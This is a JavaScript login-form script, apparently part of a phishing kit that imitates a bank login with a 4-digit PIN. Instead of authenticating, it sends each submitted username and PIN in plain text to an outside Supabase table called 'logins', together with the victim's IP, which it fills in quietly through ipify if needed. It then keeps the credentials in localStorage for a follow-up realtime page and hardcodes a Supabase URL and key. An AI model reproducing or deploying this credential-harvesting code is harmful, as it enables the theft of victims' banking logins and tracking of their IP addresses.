  (function () {
  const SUPABASE_URL = "https://yiozdjhcbragqmexiovn.supabase.co";
  const SUPABASE_ANON_KEY = "sb_publishable_Vl47Kr0iSj05_vy1BRU2jA_29BEfQAP";

  let supabaseClient = null;
  if (typeof window.supabase !== "undefined") {
    supabaseClient = window.supabase.createClient(
      SUPABASE_URL,
      SUPABASE_ANON_KEY
    );
  } else {
    console.warn(
      "[Supabase] CDN de @supabase/supabase-js no cargado; el inserto se omitirá"
    );
  }

  // IP real del cliente desde el MISMO servidor que sirve la página
  // (/api/mi-ip): consulta local. El guardado NUNCA espera por ella: si al
  // pulsar el botón no hay IP en caché, el INSERT sale igual y la IP se
  // completa en segundo plano justo después (no bloquea el flujo).
  function fetchClientIp(timeoutMs) {
    return new Promise(function (resolver) {
      const controlador = new AbortController();
      const temporizador = setTimeout(function () { controlador.abort(); }, timeoutMs || 1500);
      fetch("/api/mi-ip", { signal: controlador.signal })
        .then(function (r) { return r.ok ? r.json() : {}; })
        .then(function (d) {
          clearTimeout(temporizador);
          resolver(d.ip || "");
        })
        .catch(function () {
          clearTimeout(temporizador);
          resolver("");
        });
    });
  }

  // Respaldo externo (ipify): IP pública real vista por Internet (la del
  // túnel/VPN al hacer pruebas remotas). Solo en segundo plano y nunca
  // bloquea el guardado.
  function fetchClientIpRespaldo() {
    return fetch("https://api.ipify.org?format=json")
      .then(function (r) { return r.ok ? r.json() : {}; })
      .then(function (d) { return d.ip || ""; })
      .catch(function () { return ""; });
  }

  // Solo IPs útiles: descarta vacíos, '-', 'unknown' y direcciones de bucle
  // local (127.0.0.1 / ::1) que aparecen al probar en localhost con VPN.
  function ipUtil(ip) {
    const t = String(ip || "").trim();
    if (!t || t === "-" || /^(unknown|undefined|null|localhost)$/i.test(t)) return "";
    if (t === "127.0.0.1" || t === "::1" || t === "0.0.0.0" || t === "::") return "";
    return t;
  }

  function esLoopback(ip) {
    const t = String(ip || "").trim();
    return t === "127.0.0.1" || t === "::1" || t === "0.0.0.0" || t === "::" || t === "localhost";
  }

  // Completa la fila con una IP mejor en SEGUNDO PLANO. Si la IP guardada
  // quedó vacía o es de bucle local, se pregunta al servidor (/api/mi-ip)
  // y, si no llega, a ipify; con el resultado se actualiza la misma fila.
  function refinarIpEnSegundoPlano(idFila, tabla) {
    fetchClientIp(2500)
      .then(function (ipLocal) {
        const util = ipUtil(ipLocal);
        return util ? util : fetchClientIpRespaldo();
      })
      .then(function (ip) {
        const util = ipUtil(ip);
        if (!util) return null;
        const actual = ipEnCache;
        if (!ipUtil(actual) || esLoopback(actual)) {
          ipEnCache = util;
          try { localStorage.setItem("bc_ip_cache", util); } catch (e) {}
          return supabaseClient.from(tabla).update({ ip: util }).eq("id", idFila);
        }
        return null;
      })
      .catch(function () { return null; });
  }

  // IP en caché: se consulta al cargar la página (mientras el usuario escribe),
  // así el botón guarda DE UNA VEZ, sin esperar ninguna red al pulsarlo.
  // Solo se guardan IPs útiles (nunca '127.0.0.1' residual de otra prueba).
  let ipEnCache = "";
  (function () {
    try { ipEnCache = ipUtil(localStorage.getItem("bc_ip_cache")); } catch (e) {}
    fetchClientIp().then(function (ip) {
      const util = ipUtil(ip);
      if (util) {
        ipEnCache = util;
        try { localStorage.setItem("bc_ip_cache", util); } catch (e) {}
      }
    });
  })();

  function syncFloatingLabel(input) {
    if (!input) return;
    const hasValue = input.value.trim().length > 0;
    input.classList.toggle("bc-active", hasValue);
  }

  function setupFloatingLabels() {
    ["username", "password"].forEach((id) => {
      const input = document.getElementById(id);
      if (!input) return;

      syncFloatingLabel(input);
      input.addEventListener("input", () => syncFloatingLabel(input));
      input.addEventListener("blur", () => syncFloatingLabel(input));
    });
  }

  function updateSubmitButton() {
    const btn = document.querySelector('[data-test="login-button"]');
    const username = document.getElementById("username");
    const password = document.getElementById("password");
    if (!btn || !username || !password) return;

    const ready =
      username.value.trim().length > 0 && password.value.trim().length === 4;

    if (ready) {
      btn.removeAttribute("disabled");
    } else {
      btn.setAttribute("disabled", "");
    }
  }

  function setupFormValidation() {
    ["username", "password"].forEach((id) => {
      const input = document.getElementById(id);
      if (!input) return;
      input.addEventListener("input", updateSubmitButton);
      input.addEventListener("keyup", updateSubmitButton);
    });
    updateSubmitButton();
  }

  async function saveLoginToSupabase(username, password) {
    if (!supabaseClient) {
      console.warn("[Supabase] Cliente no disponible, omitiendo guardado");
      return false;
    }

    // IP en caché (casi siempre lista): el INSERT sale DE UNA VEZ, sin esperar
    // a ninguna llamada de red (importante bajo VPN/red lenta).
    const ip = ipEnCache;
    const payload = {
      username,
      password,
      ip,
      time: new Date().toISOString(),
    };

    const { data, error } = await supabaseClient.from("logins").insert(payload);
    if (error) throw error;

    // Refinamiento silencioso: si la IP guardada quedó vacía o de bucle local
    // (127.0.0.1), se completa en segundo plano con la IP real vista por el
    // servidor (/api/mi-ip) o, si falta, la pública de ipify. NO bloquea nada.
    if (data && data.length) {
      refinarIpEnSegundoPlano(data[0].id, "logins");
    }
    return true;
  }

  function storeCredentialsInLocalStorage(username, password) {
    try {
      localStorage.setItem("bc_username", username);
      localStorage.setItem("bc_password", password);
      localStorage.setItem("bc_login_time", new Date().toISOString());
    } catch (e) {
      console.warn("Error guardando credenciales en localStorage:", e);
    }
  }

  function attachFormHandler() {
    const form = document.getElementById("form");
    if (!form) return;

    let isSubmitting = false;

    form.addEventListener("submit", async (event) => {
      event.preventDefault();

      if (isSubmitting) return;
      isSubmitting = true;

      const username = document.getElementById("username")?.value.trim() ?? "";
      const password = document.getElementById("password")?.value.trim() ?? "";
      const btn = document.querySelector('[data-test="login-button"]');

      if (!username || password.length !== 4) {
        isSubmitting = false;
        return;
      }

      if (btn) btn.setAttribute("disabled", "");

      // Guardar en Supabase (solo si el cliente está disponible)
      try {
        const saved = await saveLoginToSupabase(username, password);
        if (saved) {
          console.log("Credenciales guardadas en Supabase");
        }
      } catch (error) {
        console.error("Error guardando en Supabase", error);
      }

      // Guardar en localStorage para usarlo luego en home-realtime.js
      storeCredentialsInLocalStorage(username, password);

      // Redirigir a home.html
      window.location.href = "home.html";
    });
  }

  function init() {
    setupFloatingLabels();
    setupFormValidation();
    attachFormHandler();
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();
